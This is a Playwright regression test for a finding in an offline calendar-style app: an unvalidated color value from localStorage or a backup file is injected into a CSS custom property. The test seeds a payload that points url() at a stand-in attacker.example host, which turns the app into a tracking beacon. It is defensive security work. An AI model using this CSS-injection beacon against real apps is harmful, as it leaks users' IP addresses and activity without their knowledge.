// Reproduces: "Unvalidated color from backup/localStorage is injected into CSS,
// letting a backup file turn the offline app into a beacon to an attacker URL"
// (app.js loadState()/saveSettings(), styles.css .day-cell.p1 { background: var(--p1-color) }).
//
// Attack: an attacker-controlled value for state.settings.p1Color/p2Color, delivered
// via localStorage["kk.settings"] (or, equivalently, via an imported backup file merged
// into state.settings — see app.js:839), is written verbatim into a CSS custom property
// with document.documentElement.style.setProperty("--p1-color", ...). CSS custom
// properties accept an arbitrary token stream, so a value like
// "url(https://attacker.example/b.png) #000" both (a) survives being read back out of
// an <input type="color"> as the harmless-looking "#000000" (so the UI shows nothing
// suspicious) and (b) still makes the browser issue a network request to the attacker's
// server every time a ".day-cell.p1 { background: var(--p1-color) }" rule paints,
// leaking IP/UA/usage-time from an app that is supposed to be 100% offline/local.
//
// This test seeds localStorage with such a poisoned settings blob *before* app.js runs
// (mirroring what a poisoned backup restore or a hand-edited localStorage value would
// produce), reloads the page, and asserts that the value actually applied to the
// document's --p1-color custom property is a plain hex color and NOT the attacker
// payload. It fails against the current code (no validation on load) and will pass
// once loadState()/import validate/sanitize colors against something like
// /^#[0-9a-f]{3,8}$/i before they reach state.settings / setProperty.
const { test } = require("@playwright/test");
const assert = require("node:assert");

const MALICIOUS_P1_COLOR = "url(https://attacker.example/b.png?u=1) #000";

// The app registers a service worker whose controllerchange handler
// triggers a page reload on a fresh/incognito context; that's irrelevant to
// this test but can race with the reload below, so block it entirely.
test.use({ serviceWorkers: "block" });

test("--p1-color was sanitized to a safe hex value", async ({ page }) => {
  // Track any outgoing request to the attacker host, as direct proof of exfiltration.
  const beaconRequests = [];
  page.on("request", (req) => {
    if (req.url().startsWith("https://attacker.example/")) beaconRequests.push(req.url());
  });

  // Land on the origin first so localStorage.setItem below targets the right origin,
  // then seed the poisoned settings blob (e.g. from a maliciously crafted backup file
  // that was imported and, per app.js:780/851, written straight into localStorage via
  // saveSettings()) *before* app.js's init()/loadState() runs on the real navigation.
  await page.goto("/index.html");
  await page.evaluate((maliciousColor) => {
    localStorage.setItem(
      "kk.settings",
      JSON.stringify({ p1Color: maliciousColor, p2Color: "#f7dd86" })
    );
  }, MALICIOUS_P1_COLOR);

  // Reload so init() -> loadState() -> render() runs fresh with the poisoned value
  // already sitting in localStorage, exactly as it would after restarting the app
  // post-restore.
  await page.reload();
  await page.waitForFunction(() =>
    document.documentElement.style.getPropertyValue("--p1-color").length > 0
  );

  const appliedValue = await page.evaluate(() =>
    document.documentElement.style.getPropertyValue("--p1-color").trim()
  );

  // Force a repaint of a p1 day cell so the CSS actually resolves var(--p1-color),
  // giving the browser a chance to fire the background-image request.
  await page.waitForTimeout(300);

  console.log("Applied --p1-color value:", JSON.stringify(appliedValue));
  console.log("Beacon requests observed:", beaconRequests);

  assert.ok(
    /^#[0-9a-f]{3,8}$/i.test(appliedValue),
    `--p1-color was set to an unvalidated, attacker-controlled value instead of a ` +
      `plain hex color: ${JSON.stringify(appliedValue)}. This value is taken from ` +
      `localStorage["kk.settings"]/imported backup with no validation (app.js loadState()), ` +
      `then injected verbatim into a CSS custom property consumed by ` +
      `".day-cell.p1 { background: var(--p1-color) }" in styles.css, letting a poisoned ` +
      `backup/localStorage value turn the offline app into a network beacon.`
  );
});
